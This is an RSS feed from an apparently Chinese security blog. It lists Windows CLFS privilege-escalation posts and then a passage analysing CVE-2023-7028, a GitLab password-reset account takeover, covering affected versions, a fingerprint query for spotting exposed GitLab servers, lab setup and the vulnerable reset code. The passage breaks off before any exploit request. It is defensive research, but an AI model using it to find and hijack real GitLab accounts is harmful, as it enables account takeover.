<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>漏洞分析 on chestnut's blog</title><link>https://www.ch35tnut.site/zh-cn/vulnerability/</link><description>Recent content in 漏洞分析 on chestnut's blog</description><generator>Hugo -- gohugo.io</generator><language>zh-cn</language><lastBuildDate>Wed, 08 Sep 2021 21:49:43 +0800</lastBuildDate><atom:link href="https://www.ch35tnut.site/zh-cn/vulnerability/index.xml" rel="self" type="application/rss+xml"/><item><title>Windows CLFS EoP</title><link>https://www.ch35tnut.site/zh-cn/vulnerability/windows-clfs-eop/</link><pubDate>Wed, 10 May 2023 00:40:54 +0800</pubDate><guid>https://www.ch35tnut.site/zh-cn/vulnerability/windows-clfs-eop/</guid><description>&lt;h3 id="windows-clfs-漏洞概览">Windows CLFS 漏洞概览&lt;/h3>
&lt;table>
&lt;thead>
&lt;tr>
&lt;th style="text-align:center">序号&lt;/th>
&lt;th style="text-align:center">漏洞名&lt;/th>
&lt;th style="text-align:center">编号&lt;/th>
&lt;th style="text-align:center">类型&lt;/th>
&lt;/tr>
&lt;/thead>
&lt;tbody>
&lt;tr>
&lt;td style="text-align:center">2&lt;/td>
&lt;td style="text-align:center">
&lt;a href="https://www.ch35tnut.site/zh-cn/vulnerability/windows-clfs-eop/cve-2023-28252/">windows CLFS 权限提升漏洞&lt;/a>&lt;/td>
&lt;td style="text-align:center">CVE-2023-28252&lt;/td>
&lt;td style="text-align:center">权限提升&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td style="text-align:center">1&lt;/td>
&lt;td style="text-align:center">
&lt;a href="https://www.ch35tnut.site/zh-cn/vulnerability/windows-clfs-eop/cve-2022-37969/">windows CLFS 权限提升漏洞&lt;/a>&lt;/td>
&lt;td style="text-align:center">CVE-2022-37969&lt;/td>
&lt;td style="text-align:center">权限提升&lt;/td>
&lt;/tr>
&lt;/tbody>
&lt;/table></description></item><item><title>CVE-2023-7028 GitLab Account Takeover</title><link>https://www.ch35tnut.site/zh-cn/vulnerability/cve-2023-7028-gitlab-account-takeover/</link><pubDate>Sat, 13 Jan 2024 02:11:06 +0800</pubDate><guid>https://www.ch35tnut.site/zh-cn/vulnerability/cve-2023-7028-gitlab-account-takeover/</guid><description>&lt;h3 id="基本信息">基本信息&lt;/h3>
&lt;p>Gitlab中可以通过重置密码接口发送恶意请求，当已知注册邮箱且开启邮箱登录时，攻击者可以获取到重置密码链接，从而重置目标账号密码，接管目标账号。&lt;/p>
&lt;h4 id="指纹">指纹&lt;/h4>
&lt;p>hunter&lt;/p>
&lt;pre tabindex="0">&lt;code>web.title=&amp;#34;GitLab&amp;#34;
&lt;/code>&lt;/pre>&lt;h3 id="影响版本">影响版本&lt;/h3>
&lt;ul>
&lt;li>16.1 to 16.1.5&lt;/li>
&lt;li>16.2 to 16.2.8&lt;/li>
&lt;li>16.3 to 16.3.6&lt;/li>
&lt;li>16.4 to 16.4.4&lt;/li>
&lt;li>16.5 to 16.5.5&lt;/li>
&lt;li>16.6 to 16.6.3&lt;/li>
&lt;li>16.7 to 16.7.1&lt;/li>
&lt;/ul>
&lt;h3 id="环境搭建">环境搭建&lt;/h3>
&lt;pre tabindex="0">&lt;code>docker pull gitlab/gitlab-ce:16.1.0-ce.0
docker run -d -p 443:443 -p 80:80 -p 222:22 --name gitlab --restart always -v /home/gitlab/config:/etc/gitlab -v /home/gitlab/logs:/var/log/gitlab -v /home/gitlab/data:/var/opt/gitlab gitlab/gitlab-ce:16.1.0-ce.0
&lt;/code>&lt;/pre>&lt;p>同时还需要配置SMTP发邮件，这里采用Gmail来发，首先开启2FA，而后设置应用专用密码&lt;/p>
&lt;blockquote>
&lt;p>
&lt;a href="https://support.google.com/mail/answer/185833?hl=zh-Hans" target="_blank">https://support.google.com/mail/answer/185833?hl=zh-Hans&lt;/a>&lt;/p>
&lt;/blockquote>
&lt;p>在/etc/gitlab/gitlab.rb配置邮件配置&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-ruby" data-lang="ruby">&lt;span style="display:flex;">&lt;span>gitlab_rails&lt;span style="color:#f92672">[&lt;/span>&lt;span style="color:#e6db74">&amp;#39;smtp_enable&amp;#39;&lt;/span>&lt;span style="color:#f92672">]&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#66d9ef">true&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>gitlab_rails&lt;span style="color:#f92672">[&lt;/span>&lt;span style="color:#e6db74">&amp;#39;smtp_address&amp;#39;&lt;/span>&lt;span style="color:#f92672">]&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#e6db74">&amp;#34;smtp.gmail.com&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>gitlab_rails&lt;span style="color:#f92672">[&lt;/span>&lt;span style="color:#e6db74">&amp;#39;smtp_port&amp;#39;&lt;/span>&lt;span style="color:#f92672">]&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">587&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>gitlab_rails&lt;span style="color:#f92672">[&lt;/span>&lt;span style="color:#e6db74">&amp;#39;smtp_user_name&amp;#39;&lt;/span>&lt;span style="color:#f92672">]&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#e6db74">&amp;#34;you.email@gmail.com&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>gitlab_rails&lt;span style="color:#f92672">[&lt;/span>&lt;span style="color:#e6db74">&amp;#39;smtp_password&amp;#39;&lt;/span>&lt;span style="color:#f92672">]&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#e6db74">&amp;#34;应用专用密码&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>gitlab_rails&lt;span style="color:#f92672">[&lt;/span>&lt;span style="color:#e6db74">&amp;#39;smtp_domain&amp;#39;&lt;/span>&lt;span style="color:#f92672">]&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#e6db74">&amp;#34;smtp.gmail.com&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>gitlab_rails&lt;span style="color:#f92672">[&lt;/span>&lt;span style="color:#e6db74">&amp;#39;smtp_authentication&amp;#39;&lt;/span>&lt;span style="color:#f92672">]&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#e6db74">&amp;#34;login&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>gitlab_rails&lt;span style="color:#f92672">[&lt;/span>&lt;span style="color:#e6db74">&amp;#39;smtp_enable_starttls_auto&amp;#39;&lt;/span>&lt;span style="color:#f92672">]&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#66d9ef">true&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>gitlab_rails&lt;span style="color:#f92672">[&lt;/span>&lt;span style="color:#e6db74">&amp;#39;smtp_tls&amp;#39;&lt;/span>&lt;span style="color:#f92672">]&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#66d9ef">false&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"># gitlab_rails[&amp;#39;smtp_pool&amp;#39;] = false&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">###! **Can be: &amp;#39;none&amp;#39;, &amp;#39;peer&amp;#39;, &amp;#39;client_once&amp;#39;, &amp;#39;fail_if_no_peer_cert&amp;#39;**&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">###! Docs: http://api.rubyonrails.org/classes/ActionMailer/Base.html&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"># gitlab_rails[&amp;#39;smtp_openssl_verify_mode&amp;#39;] = &amp;#39;peer&amp;#39;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>gitlab_rails&lt;span style="color:#f92672">[&lt;/span>&lt;span style="color:#e6db74">&amp;#39;smtp_ca_path&amp;#39;&lt;/span>&lt;span style="color:#f92672">]&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#e6db74">&amp;#34;/etc/ssl/certs&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>gitlab_rails&lt;span style="color:#f92672">[&lt;/span>&lt;span style="color:#e6db74">&amp;#39;smtp_ca_file&amp;#39;&lt;/span>&lt;span style="color:#f92672">]&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#e6db74">&amp;#34;/etc/ssl/certs/ca-certificates.crt&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">### Email Settings&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>gitlab_rails&lt;span style="color:#f92672">[&lt;/span>&lt;span style="color:#e6db74">&amp;#39;gitlab_email_enabled&amp;#39;&lt;/span>&lt;span style="color:#f92672">]&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#66d9ef">true&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">##! If your SMTP server does not like the default &amp;#39;From: gitlab@gitlab.example.com&amp;#39;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">##! can change the &amp;#39;From&amp;#39; with this setting.&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>gitlab_rails&lt;span style="color:#f92672">[&lt;/span>&lt;span style="color:#e6db74">&amp;#39;gitlab_email_from&amp;#39;&lt;/span>&lt;span style="color:#f92672">]&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#e6db74">&amp;#39;you.email@gmail.com&amp;#39;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>gitlab_rails&lt;span style="color:#f92672">[&lt;/span>&lt;span style="color:#e6db74">&amp;#39;gitlab_email_display_name&amp;#39;&lt;/span>&lt;span style="color:#f92672">]&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#e6db74">&amp;#39;display_name&amp;#39;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>gitlab_rails&lt;span style="color:#f92672">[&lt;/span>&lt;span style="color:#e6db74">&amp;#39;gitlab_email_reply_to&amp;#39;&lt;/span>&lt;span style="color:#f92672">]&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#e6db74">&amp;#39;noreply@noreply.site&amp;#39;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>gitlab_rails&lt;span style="color:#f92672">[&lt;/span>&lt;span style="color:#e6db74">&amp;#39;gitlab_email_subject_suffix&amp;#39;&lt;/span>&lt;span style="color:#f92672">]&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#e6db74">&amp;#39;&amp;#39;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>gitlab_rails&lt;span style="color:#f92672">[&lt;/span>&lt;span style="color:#e6db74">&amp;#39;gitlab_email_smime_enabled&amp;#39;&lt;/span>&lt;span style="color:#f92672">]&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#66d9ef">false&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>gitlab_rails&lt;span style="color:#f92672">[&lt;/span>&lt;span style="color:#e6db74">&amp;#39;gitlab_email_smime_key_file&amp;#39;&lt;/span>&lt;span style="color:#f92672">]&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#e6db74">&amp;#39;/etc/gitlab/ssl/gitlab_smime.key&amp;#39;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>gitlab_rails&lt;span style="color:#f92672">[&lt;/span>&lt;span style="color:#e6db74">&amp;#39;gitlab_email_smime_cert_file&amp;#39;&lt;/span>&lt;span style="color:#f92672">]&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#e6db74">&amp;#39;/etc/gitlab/ssl/gitlab_smime.crt&amp;#39;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>gitlab_rails&lt;span style="color:#f92672">[&lt;/span>&lt;span style="color:#e6db74">&amp;#39;gitlab_email_smime_ca_certs_file&amp;#39;&lt;/span>&lt;span style="color:#f92672">]&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#e6db74">&amp;#39;/etc/gitlab/ssl/gitlab_smime_cas.crt&amp;#39;&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;blockquote>
&lt;p>
&lt;a href="https://kifarunix.com/configure-gitlab-to-use-gmail-smtp-for-outbound-mails/" target="_blank">https://kifarunix.com/configure-gitlab-to-use-gmail-smtp-for-outbound-mails/&lt;/a>&lt;/p>
&lt;/blockquote>
&lt;p>在修改配置后，使用&lt;code>gitlab-ctl reconfigure&lt;/code>命令重新加载配置文件，并且测试是否可以通过SMTP发送邮件&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>gitlab-rails console
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Notify.test_email&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#e6db74">&amp;#39;username@xxx.com&amp;#39;&lt;/span>, &lt;span style="color:#e6db74">&amp;#39;Message Subject&amp;#39;&lt;/span>, &lt;span style="color:#e6db74">&amp;#39;Message Body&amp;#39;&lt;/span>&lt;span style="color:#f92672">)&lt;/span>.deliver_now
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Delivered mail 16932d5092738@35a8758e2d8d.mail &lt;span style="color:#f92672">(&lt;/span>6085.9ms&lt;span style="color:#f92672">)&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>
&lt;img alt="" src="https://www.ch35tnut.site/images/vulnerability/CVE-2023-7028-GitLab-account-takeover.zh-cn.assets/3.png" />&lt;/p>
&lt;p>Gitlab 默认root用户有一个admin[at]example.com的邮箱，为了避免干扰，需要将默认邮箱换成我们指定的邮箱，参考
&lt;a href="https://www.ziji.work/gitlab/gitlab%E6%90%AD%E5%BB%BA%E5%8F%8A%E9%85%8D%E7%BD%AE%E4%B8%8E%E6%97%A5%E5%B8%B8%E7%AE%A1%E7%90%86.html" target="_blank">修改默认邮箱&lt;/a>&lt;/p>
&lt;pre tabindex="0">&lt;code>gitlab-rails console -e production
Loading production environment (Rails 4.2.8)
irb(main):001:0&amp;gt; user = User.where(id: 1).first
=&amp;gt; #&amp;lt;User id: 1, email: &amp;#34;admin@example.com&amp;#34;......
irb(main):009:0&amp;gt; user.email = &amp;#39;xxx@xxx.com&amp;#39;
irb(main):011:0&amp;gt; user.save!
=&amp;gt; true
irb(main):011:0&amp;gt; exit
&lt;/code>&lt;/pre>&lt;p>同时修改/etc/gitlab/gitlab.rb里面的默认邮箱为我们自己的Gmail邮箱。&lt;/p>
&lt;p>
&lt;img alt="" src="https://www.ch35tnut.site/images/vulnerability/CVE-2023-7028-GitLab-account-takeover.zh-cn.assets/4.png" />&lt;/p>
&lt;blockquote>
&lt;p>吐槽一下国内邮箱，说的就是你163，配一个SMTP还这么麻烦，乱七八糟的验证码，Gmail配置2FA+APP专用密码就行了&lt;/p>
&lt;/blockquote>
&lt;h3 id="技术分析调试">技术分析&amp;amp;调试&lt;/h3>
&lt;p>&lt;strong>信息收集&lt;/strong>
GitLab官方通告中解释，该漏洞是源于允许用户通过辅助电子邮件地址重置其密码，在16.1.0中引入。&lt;/p>
&lt;blockquote>
&lt;p>在 16.1.0 中进行了更改，允许用户通过辅助电子邮件地址重置其密码。该漏洞是电子邮件验证过程中的错误导致的。此修补程序已修复该错误，如上所述，我们实施了许多预防性安全措施来保护客户。&lt;/p>
&lt;/blockquote>
&lt;p>查看
&lt;a href="https://gitlab.com/rluna-gitlab/gitlab-ce/-/commit/24d1060c0ae7d0ba432271da98f4fa20ab6fd671" target="_blank">补丁&lt;/a>，首先看到补丁对几个测试文件做了修改&lt;/p>
&lt;p>
&lt;img alt="" src="https://www.ch35tnut.site/images/vulnerability/CVE-2023-7028-GitLab-account-takeover.zh-cn.assets/5.png" />&lt;/p>
&lt;p>看不懂ruby代码，让AI分析&lt;/p>
&lt;p>&lt;code>这段 Ruby 代码是一个使用 RSpec 编写的测试套件的一部分，主要测试 send_reset_password_instructions 方法的行为。这个方法的主要功能是向用户发送重置密码的指令。&lt;/code>
&lt;code>首先，代码定义了一些测试用的数据，包括用户的未确认的次要电子邮件地址、未知的电子邮件地址、无效的电子邮件地址、尝试进行 SQL 注入的电子邮件地址，以及另一个用户的已确认和未确认的主要电子邮件地址。&lt;/code>
&lt;code>然后，代码定义了两个共享的测试示例：&lt;/code>&lt;/p>
&lt;ol>
&lt;li>&lt;code>&amp;quot;sends 'Reset password instructions' email&amp;quot;：这个测试示例包含两个测试用例，分别测试当调用 send_reset_password_instructions 方法时，是否能找到预期的用户，以及是否发送了重置密码指令的电子邮件。&lt;/code>&lt;/li>
&lt;li>&lt;code>&amp;quot;does not send 'Reset password instructions' email&amp;quot;：这个测试示例也包含两个测试用例，分别测试当调用 send_reset_password_instructions 方法时，是否找不到用户（并返回一个带有错误的新用户实例），以及是否没有发送任何电子邮件。&lt;/code>&lt;/li>
&lt;/ol>
&lt;p>&lt;code>这些测试用例通过调用 expect 方法和各种匹配器（如 eq、be_instance_of、be_new_record、not_to be_empty、have_enqueued_mail 和 not_to have_enqueued_mail）来验证 send_reset_password_instructions 方法的行为是否符合预期。&lt;/code>&lt;/p>
&lt;p>&lt;code>这段 Ruby 代码定义了一个名为 EmailHelpers 的模块，该模块包含了一系列的方法，主要用于在测试中帮助处理和验证电子邮件的发送。&lt;/code>&lt;/p>
&lt;p>&lt;code>以下是一些主要方法的解释：&lt;/code>&lt;/p>
&lt;ul>
&lt;li>&lt;code>sent_to_user(user, recipients: email_recipients)：此方法计算给定用户的通知电子邮件地址在收件人列表中出现的次数。&lt;/code>&lt;/li>
&lt;li>&lt;code>reset_delivered_emails!：此方法清除所有已发送的电子邮件和排队的作业，主要用于在每个测试用例开始前重置状态。&lt;/code>&lt;/li>
&lt;li>&lt;code>expect_only_one_email_to_be_sent(subject:, to:)：此方法验证是否只发送了一封电子邮件，且该电子邮件的主题和收件人是否与预期相符。&lt;/code>&lt;/li>
&lt;li>&lt;code>should_only_email(*users, kind: :to)：此方法验证是否只有指定的用户收到了电子邮件。&lt;/code>&lt;/li>
&lt;li>&lt;code>should_email(user, times: 1, recipients: email_recipients)：此方法验证指定的用户是否收到了预期数量的电子邮件。&lt;/code>&lt;/li>
&lt;li>&lt;code>should_not_email(user, recipients: email_recipients)：此方法验证指定的用户是否没有收到电子邮件。&lt;/code>&lt;/li>
&lt;li>&lt;code>should_not_email_anyone：此方法验证是否没有发送任何电子邮件。&lt;/code>&lt;/li>
&lt;li>&lt;code>email_recipients(kind: :to)：此方法返回所有电子邮件的收件人列表。&lt;/code>&lt;/li>
&lt;li>&lt;code>find_email_for(user)：此方法查找发送给指定用户的电子邮件。&lt;/code>&lt;/li>
&lt;li>&lt;code>have_referable_subject(referable, include_project: true, reply: false)：此方法验证电子邮件的主题是否包含指定的引用信息。&lt;/code>&lt;/li>
&lt;li>&lt;code>enqueue_mail_with(mailer_class, mail_method_name, *args)：此方法验证是否已将指定的电子邮件作业排入队列。&lt;/code>&lt;/li>
&lt;li>&lt;code>expect_sender(user, sender_email: nil)：此方法验证电子邮件的发送者是否与预期的用户相符。&lt;/code>&lt;/li>
&lt;li>&lt;code>expect_service_desk_custom_email_delivery_options(service_desk_setting)：此方法验证电子邮件的发送设置是否与服务台的自定义电子邮件设置相符。&lt;/code>
&lt;code>这个模块主要用于在测试中验证电子邮件的发送行为，确保电子邮件的发送者、收件人、主题等都符合预期。&lt;/code>&lt;/li>
&lt;/ul>
&lt;p>在gitlab中查找&lt;code>PasswordsController&lt;/code>，可以在如下路径找到其代码&lt;code>/opt/gitlab/embedded/lib/ruby/gems/3.0.0/gems/devise-4.8.1/app/controllers/devise/passwords_controller.rb&lt;/code>&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-ruby" data-lang="ruby">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"># frozen_string_literal: true&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">class&lt;/span> &lt;span style="color:#a6e22e">Devise&lt;/span>&lt;span style="color:#f92672">::&lt;/span>&lt;span style="color:#66d9ef">PasswordsController&lt;/span> &lt;span style="color:#f92672">&amp;lt;&lt;/span> &lt;span style="color:#66d9ef">DeviseController&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> prepend_before_action &lt;span style="color:#e6db74">:require_no_authentication&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e"># Render the #edit only if coming from a reset password email link&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> append_before_action &lt;span style="color:#e6db74">:assert_reset_token_passed&lt;/span>, &lt;span style="color:#e6db74">only&lt;/span>: &lt;span style="color:#e6db74">:edit&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e"># GET /resource/password/new&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">def&lt;/span> &lt;span style="color:#a6e22e">new&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> self&lt;span style="color:#f92672">.&lt;/span>resource &lt;span style="color:#f92672">=&lt;/span> resource_class&lt;span style="color:#f92672">.&lt;/span>new
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">end&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e"># POST /resource/password&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">def&lt;/span> &lt;span style="color:#a6e22e">create&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> self&lt;span style="color:#f92672">.&lt;/span>resource &lt;span style="color:#f92672">=&lt;/span> resource_class&lt;span style="color:#f92672">.&lt;/span>send_reset_password_instructions(resource_params)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">yield&lt;/span> resource &lt;span style="color:#66d9ef">if&lt;/span> block_given?
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> successfully_sent?(resource)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> respond_with({}, &lt;span style="color:#e6db74">location&lt;/span>: after_sending_reset_password_instructions_path_for(resource_name))
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">else&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> respond_with(resource)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">end&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">end&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e"># GET /resource/password/edit?reset_password_token=abcdef&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">def&lt;/span> &lt;span style="color:#a6e22e">edit&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> self&lt;span style="color:#f92672">.&lt;/span>resource &lt;span style="color:#f92672">=&lt;/span> resource_class&lt;span style="color:#f92672">.&lt;/span>new
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> set_minimum_password_length
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> resource&lt;span style="color:#f92672">.&lt;/span>reset_password_token &lt;span style="color:#f92672">=&lt;/span> params&lt;span style="color:#f92672">[&lt;/span>&lt;span style="color:#e6db74">:reset_password_token&lt;/span>&lt;span style="color:#f92672">]&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">end&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>其中&lt;code>PasswordsController&lt;/code>类和create函数能和后面的审计日志相应。让AI分析这段代码&lt;/p>
&lt;blockquote>
&lt;p>这段代码是 Ruby on Rails 中 Devise gem 的一部分，用于处理用户密码重置的功能。Devise 是一个灵活的身份验证解决方案，它提供了一套完整的 MVC 解决方案来处理用户注册、登录、密码重置等功能。&lt;/p>
&lt;p>&lt;code>Devise::PasswordsController&lt;/code> 是一个控制器，它继承自 &lt;code>DeviseController&lt;/code>。这个控制器主要处理与用户密码相关的请求。&lt;/p>
&lt;p>&lt;code>prepend_before_action :require_no_authentication&lt;/code> 这行代码表示在执行任何动作之前，都需要先执行 &lt;code>require_no_authentication&lt;/code> 方法。这个方法的作用是确保用户在尝试重置密码时未登录。&lt;/p>
&lt;p>&lt;code>append_before_action :assert_reset_token_passed, only: :edit&lt;/code> 这行代码表示只有在执行 &lt;code>edit&lt;/code> 动作时，才需要执行 &lt;code>assert_reset_token_passed&lt;/code> 方法。这个方法的作用是确保用户在尝试访问密码重置页面时，提供了有效的重置令牌。&lt;/p>
&lt;p>&lt;code>new&lt;/code> 动作用于显示密码重置请求的表单。&lt;/p>
&lt;p>&lt;code>create&lt;/code> 动作用于处理密码重置请求。首先，它会调用 &lt;code>resource_class.send_reset_password_instructions(resource_params)&lt;/code> 方法发送密码重置指令。然后，如果邮件发送成功，它会重定向到 &lt;code>after_sending_reset_password_instructions_path_for(resource_name)&lt;/code>，否则，它会重新渲染密码重置请求的表单，并显示错误信息。&lt;/p>
&lt;/blockquote>
&lt;p>可知其主要是调用&lt;code>resource_class.send_reset_password_instructions&lt;/code>，其代码在&lt;code>app/models/concerns/recoverable_by_any_email.rb&lt;/code>&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-ruby" data-lang="ruby">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"># frozen_string_literal: true&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"># Concern that overrides the Devise methods&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"># to send reset password instructions to any verified user email&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">module&lt;/span> RecoverableByAnyEmail
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">extend&lt;/span> &lt;span style="color:#66d9ef">ActiveSupport&lt;/span>&lt;span style="color:#f92672">::&lt;/span>&lt;span style="color:#66d9ef">Concern&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> class_methods &lt;span style="color:#66d9ef">do&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">def&lt;/span> &lt;span style="color:#a6e22e">send_reset_password_instructions&lt;/span>(attributes &lt;span style="color:#f92672">=&lt;/span> {})
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> email &lt;span style="color:#f92672">=&lt;/span> attributes&lt;span style="color:#f92672">.&lt;/span>delete(&lt;span style="color:#e6db74">:email&lt;/span>)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">super&lt;/span> &lt;span style="color:#66d9ef">unless&lt;/span> email
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
